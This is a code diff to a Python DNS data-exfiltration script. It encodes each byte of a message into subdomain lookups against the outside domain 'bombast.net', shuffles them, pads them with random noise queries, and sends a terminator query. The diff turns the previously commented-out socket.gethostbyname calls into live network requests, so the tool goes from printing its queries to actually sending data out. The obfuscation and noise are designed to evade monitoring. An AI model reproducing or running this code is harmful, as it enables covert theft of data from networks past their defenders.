@@ -1,7 +1,7 @@
 import socket
 import random
 import os, binascii
-
+import time
 MAX_NOISE_COUNT = 3
 DOMAIN = "bombast.net"
 FLAG = 'a'
@@ -16,28 +16,33 @@ def main():
     message = '\S' + payload + '\E'
     message = message.encode()
     print(message)
-
-    # Loop through and send message
-    for b in range(len(message)):
-
-        malicious = '-' + get_rand_nibble() + FLAG + get_rand_byte() + format(message[b], 'x') + get_rand_nibble() + '.' + DOMAIN
+    malicious_payloads = []
+    for i, b in enumerate(message):
+        malicious = "{:04x}".format(i) + 'S' + get_rand_nibble() + FLAG + format(b, 'x') + get_rand_nibble() + '.' + DOMAIN
+        malicious_payloads.append(malicious)
+    random.shuffle(malicious_payloads)
+   # Loop through and send message
+    for malicious in malicious_payloads:
 
         # inject 1 to X amounts of noise into the pipe
         for i in range(random.randint(1, MAX_NOISE_COUNT)):
             req = get_noise() + '.' + DOMAIN
-            print(req)
-            #socket.gethostbyname(req)
-
+#            print(req)
+            socket.gethostbyname(req)
+  #          time.sleep(1)
         # inject our payload
-        print(malicious)
-        #socket.gethostbyname(malicious)
-
+ #       print(malicious)
+        socket.gethostbyname(malicious)
+ #       time.sleep(1)
         # inject 0 to X amounts of noise into the pipe
         for i in range(random.randint(0, MAX_NOISE_COUNT)):
             req = get_noise() + '.' + DOMAIN
-            print(req)
-            #socket.gethostbyname(req)
+  #          print(req)
+            socket.gethostbyname(req)
+#            time.sleep(1)
 
+    malicious = 'ffffS' + get_rand_nibble() + FLAG + format(b, 'x') + get_rand_nibble() + '.' + DOMAIN
+    socket.gethostbyname(malicious)
 
 def get_noise():
     noise = ''.join(random.choice('0123456789abcdef') for n in range(1)) #a included
